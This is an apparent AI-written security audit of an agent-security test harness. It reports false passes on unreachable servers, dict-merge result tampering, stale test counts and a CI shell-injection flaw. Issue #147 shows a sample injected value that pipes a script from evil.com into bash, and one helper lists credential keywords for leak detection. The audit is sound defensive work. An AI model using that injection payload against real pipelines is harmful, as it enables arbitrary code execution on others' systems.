# Critical Evaluation — Round 31

**Date:** 2026-04-08
**Evaluator:** Claude Opus 4.6 (independent audit)
**Version:** v3.9.0 (dev, post v3.10 feature merge)
**Test count:** 431 tests across 29 modules (verified by `count_tests.py`)
**Self-test suite:** 160 passed, 0 failed, 49 subtests passed

---

## What Changed Since Last Evaluation

- README restructured: 830 → 124 lines, reference content moved to `docs/`
- 5 new modules: CrewAI CVE (11), Memory (10), Multi-Agent (12), Intent Contract (8), Top 10 Failures (script)
- 3 expanded modules: L402 (14→33), x402 (41→52), MCP (13→14), A2A (12→13)
- New tools: `scripts/html_report.py`, `scripts/top10_failures.py`
- `--html` CLI flag added
- 16 issues closed

---

## Prior Fix Verification

| Issue | Severity | Status | Evidence |
|-------|----------|--------|----------|
| N/A — first independent audit of this scope | — | — | — |

---

## New Issues Found

### ISSUE #145 — CRITICAL: Unreachable server passes all advanced attack tests

**Severity:** CRITICAL
**Files:** `protocol_tests/advanced_attacks.py:94-95,148`, `protocol_tests/gtg1002_simulation.py:104`, `protocol_tests/identity_harness.py:114`

The `_err()` helper returns `True` for connection errors (`{"_error": True, "_exception": "Connection refused"}`). The test logic at line 148:

```python
if _err(resp) or not _leak(resp):
    blocked += 1
```

treats "server unreachable" identically to "server correctly blocked the attack." Running the advanced attack suite against `http://localhost:99999` (nothing listening) produces **10/10 PASS** because every request returns a connection error, `_err()` returns True, and `blocked` increments to 100%.

This is the most severe finding because it undermines the core value proposition — a user pointing the harness at a wrong URL, a down server, or a firewall-blocked endpoint gets a false "all clear."

**Affects:** `advanced_attacks.py` (10 tests), `gtg1002_simulation.py` (17 tests), `identity_harness.py` (18 tests) = **45 tests** or ~10% of the harness.

**Recommended fix:** Add a connectivity pre-check. If the target returns only connection errors, abort with "target unreachable" instead of running tests. At minimum, track `connection_errors` separately from `blocked` and report them distinctly.

---

### ISSUE #146 — HIGH: Dict-merge allows malicious server to manipulate test outcomes

**Severity:** HIGH
**Files:** `protocol_tests/advanced_attacks.py:81-83`, `protocol_tests/jailbreak_harness.py:78-80`, `protocol_tests/mcp_harness.py:144-145`

When parsing server responses:
```python
result = json.loads(body) if body else {}
result["_status"] = resp.status
result["_body"] = body[:2000]
```

The harness merges server-controlled JSON into the same dict as internal metadata keys (`_status`, `_body`, `_error`). A server responding with `{"_error": true}` would cause `_err()` to return True, making the harness think the server blocked the attack when it actually processed it.

A malicious MCP server under test could craft responses to pass every test by including `{"_error": true}` in its JSON.

**Affects:** All modules using `http_post()` with this pattern (advanced_attacks, jailbreak, identity, gtg1002).

**Recommended fix:** Parse server response into a nested key:
```python
result = {"_meta": {"status": resp.status}, "server_response": json.loads(body)}
```

---

### ISSUE #147 — HIGH: GitHub Action shell injection via unquoted variables

**Severity:** HIGH
**File:** `action.yml:75-82`

```bash
CMD="python -m protocol_tests.mcp_harness --transport ${INPUT_TRANSPORT} --url ${INPUT_TARGET_URL} --report ${REPORT_FILE}"
...
${CMD} || true
```

`INPUT_TARGET_URL` and `INPUT_CATEGORIES` are user-supplied GitHub Action inputs interpolated into a shell command without quoting. A workflow user could supply `target_url: "http://x; curl evil.com/shell.sh | bash"` and achieve arbitrary code execution in the CI runner.

**Recommended fix:** Use GitHub Actions `env:` block with proper quoting, or use an array:
```bash
python -m protocol_tests.mcp_harness \
  --transport "${INPUT_TRANSPORT}" \
  --url "${INPUT_TARGET_URL}" \
  --report "${REPORT_FILE}"
```

---

### ISSUE #148 — HIGH: MCP-008 (Malformed JSON Handling) can never fail

**Severity:** HIGH
**File:** `protocol_tests/mcp_harness.py:701-715`

All three response branches increment `handled_count`:
1. JSON response with `"error"` key → increment
2. Non-JSON response → increment
3. No response / connection closed → increment

The only path that does NOT increment is: server returns valid JSON without an `"error"` key (i.e., server returns a *success* response to garbage input). While this is technically the right failure condition, any network error or crash also counts as "handled," making this test unreliable. A completely dead server passes.

**Recommended fix:** Distinguish "server returned a proper error" (good) from "server didn't respond at all" (inconclusive). Only the first should count as handled.

---

### ISSUE #149 — HIGH: `_leak()` false-positives on common protocol keywords

**Severity:** HIGH
**Files:** `protocol_tests/advanced_attacks.py:97-101`, `protocol_tests/gtg1002_simulation.py:107`, `protocol_tests/identity_harness.py:118`

```python
def _leak(resp):
    s = json.dumps(resp).lower() if resp else ""
    return any(k in s for k in ["api_key", "password", "secret", "ssn", "salary",
                                  "bank_account", "credit_card", "/etc/passwd", "root:",
                                  "bearer ", "token", "credential", "private_key"])
```

The keyword `"token"` matches ANY response containing the word "token" — including legitimate error messages like `"authentication token required"`, `"invalid token"`, `"token expired"`, or `"token_type": "bearer"`. This causes false FAIL results on any server that mentions tokens in its responses.

**Recommended fix:** Use more specific patterns: `"token": "ey` (JWT), `"token": "sk-` (API key), or require the keyword to appear as a JSON value with actual credential-like content, not just as a key name.

---

### ISSUE #150 — MEDIUM: `free_scan.py` claims "342 tests across 24 modules"

**Severity:** MEDIUM
**File:** `scripts/free_scan.py:154,273`

The recommendation text still says "342 tests across 24 modules" — 3 versions behind the actual count of 431 tests across 29 modules.

---

### ISSUE #151 — MEDIUM: `cli.py` HARNESSES descriptions have stale test counts

**Severity:** MEDIUM
**File:** `protocol_tests/cli.py:33-130`

Multiple module descriptions in the `HARNESSES` dict don't match actual test counts:

| Module | Claimed | Actual |
|--------|---------|--------|
| MCP | 13 tests | 14 tests |
| A2A | 12 tests | 13 tests |
| x402 | 25 tests | 52 tests |
| L402 | 14 tests (in some refs) | 33 tests |
| Framework Adapters | 24 tests | 11 tests |

These descriptions appear in `agent-security list` output and are visible to users.

---

### ISSUE #152 — MEDIUM: Simulation mode only works for 1 of 20 harnesses

**Severity:** MEDIUM
**Files:** All harness modules

Running `agent-security test <harness> --simulate --json` only produces JSON output for `aiuc1`. All other 19 harnesses produce either no output or non-JSON output in simulate mode. This means:
1. The CI/CD pipeline can't dry-run tests
2. The `--json` flag is only tested against live/mock servers
3. `html_report.py` and `top10_failures.py` can't be demo'd without a running server

**Recommended fix:** Ensure every harness supports `--simulate` with valid JSON output. This is table stakes for a CI-integrated tool.

---

### ISSUE #153 — MEDIUM: No URL validation in harness modules

**Severity:** MEDIUM
**Files:** All `protocol_tests/*.py` harness modules

Only `scripts/free_scan.py` validates URLs for SSRF safety (private IP ranges, DNS rebinding). All 29 harness modules accept `--url` without validation. If the harness is deployed as a service or invoked from CI with user-supplied URLs, internal endpoints could be scanned.

---

### ISSUE #154 — MEDIUM: `community_runner.py` uses `yaml.safe_load` but no file size limit

**Severity:** MEDIUM
**File:** `protocol_tests/community_runner.py`

Community YAML plugins are loaded with `safe_load` (good) but there's no file size check. A 1GB YAML file would be loaded entirely into memory before parsing.

---

### ISSUE #155 — LOW: Duplicate `wilson_ci` implementation

**Severity:** LOW
**Files:** `protocol_tests/jailbreak_harness.py:36-48` vs `protocol_tests/statistical.py`

The Wilson confidence interval is reimplemented inline in `jailbreak_harness.py` instead of importing from the canonical implementation in `statistical.py`.

---

### ISSUE #156 — LOW: `StdioTransport` uses `select` module (not available on Windows)

**Severity:** LOW
**File:** `protocol_tests/mcp_harness.py:202-203`

The `select.select()` call on `self.proc.stdout` does not work on Windows. `pyproject.toml` does not restrict to Linux-only.

---

### ISSUE #157 — LOW: Stale worktree branches polluting local repo

**Severity:** LOW
**File:** `.git/refs/heads/worktree-agent-*`

Three orphaned worktree branches exist locally: `worktree-agent-a8ad966f`, `worktree-agent-accb5858`, `worktree-agent-acdcc494`. These have no unique commits vs main and should be cleaned up.

---

## What's Good

1. **Self-test suite is comprehensive:** 160 tests covering module registration, test ID uniqueness, OWASP mapping, AIUC-1 crosswalk, and README completeness. All pass.
2. **Statistical rigor:** Wilson CI implementation with proper edge cases (0 trials, all pass, all fail). Bootstrap CI for non-binary outcomes. NIST AI 800-2 alignment is genuine.
3. **Test ID discipline:** No duplicate test IDs across 29 modules (verified by `TestTestIDUniqueness`). Every test has a unique, namespaced identifier.
4. **Evidence pack workflow:** `evidence_pack.py` produces HMAC-signed JSON + markdown — this is audit-ready and well-structured.
5. **Mock server for self-validation:** The bundled mock server with a deliberately vulnerable tool is a good testing pattern.
6. **README restructure:** The 830→124 line reduction dramatically improves first-impression signal.
7. **New module quality:** Memory, multi-agent, and intent contract harnesses follow the established patterns consistently.
8. **Behavioral profiling:** Drift scoring between runs is a genuine differentiator vs static scanners.

---

## Methods

- Read 25+ files across `protocol_tests/`, `scripts/`, `testing/`, root configs
- Ran full self-test suite: `python3 -m pytest testing/ -v` (160 passed)
- Ran MCP harness against bundled mock server (11/14 pass, 3 expected failures)
- Attempted `--simulate --json` on all 20 harnesses (1/20 produced valid JSON)
- Code audit focused on: command injection, SSRF, dict-merge, test logic soundness, count consistency
- Verified `count_tests.py` output: 431 unique test IDs

---

## Self-Test Suite

| Suite | Tests | Passed | Failed |
|-------|-------|--------|--------|
| test_code_quality.py | 33 (+27 subtests) | 33 | 0 |
| test_statistical.py | 12 | 12 | 0 |
| test_transport.py | 7 | 7 | 0 |
| test_trial_runner.py | 8 | 8 | 0 |
| test_oatr_v120_fixtures.py | 29 | 29 | 0 |
| test_gtg1002_patterns.py | 22 | 22 | 0 |
| test_autogen_harness.py | 20 | 20 | 0 |
| **Total** | **160** | **160** | **0** |

---

## Score: 7.5/10

| Round | Score | Notes |
|-------|-------|-------|
| R31 | **7.5/10** | 1 CRITICAL (unreachable server false pass), 4 HIGH (dict-merge, shell injection, MCP-008, leak false-positive), 5 MEDIUM, 3 LOW |

**Trajectory:** First independent audit at this scope. The 1 CRITICAL and 4 HIGH issues are significant but all fixable in a single sprint. The core architecture (test ID discipline, statistical rigor, evidence packs) is sound. The issues are in the HTTP helper layer and argument handling, not in the test logic itself.

---

## Recommendations

### Immediate (before v3.10 release)

1. **Fix #145 (CRITICAL):** Add connectivity pre-check to `_err()`-based modules. If >50% of responses are connection errors, report "target unreachable" not "all tests passed."
2. **Fix #147 (HIGH):** Quote all variables in `action.yml`. This is a one-line fix that prevents shell injection in CI.
3. **Fix #146 (HIGH):** Namespace server responses to prevent dict-merge manipulation. Parse into `{"_meta": {...}, "response": {...}}`.
4. **Fix #149 (HIGH):** Tighten `_leak()` keyword matching — require value context, not just key presence.
5. **Fix #150-#151 (MEDIUM):** Update stale counts in `free_scan.py` and `cli.py` HARNESSES descriptions.

### Before next release

6. **Fix #152 (MEDIUM):** Make `--simulate --json` work for all harnesses, not just `aiuc1`. This is critical for CI adoption.
7. **Fix #148 (HIGH):** MCP-008 should distinguish "proper error response" from "server crashed/unreachable."
8. **Add integration test:** Run the full harness against the mock server in CI. Currently only self-tests run in CI — no end-to-end test against a live target.

### Architecture

9. **Extract `http_post()` and `_err()`/`_leak()` into a shared module.** These are copy-pasted across 4+ files with slight variations. One fix should fix all.
10. **Consider a `TestOutcome` enum:** `PASS | FAIL | INCONCLUSIVE | ERROR`. Currently the binary pass/fail model can't distinguish "blocked" from "unreachable."
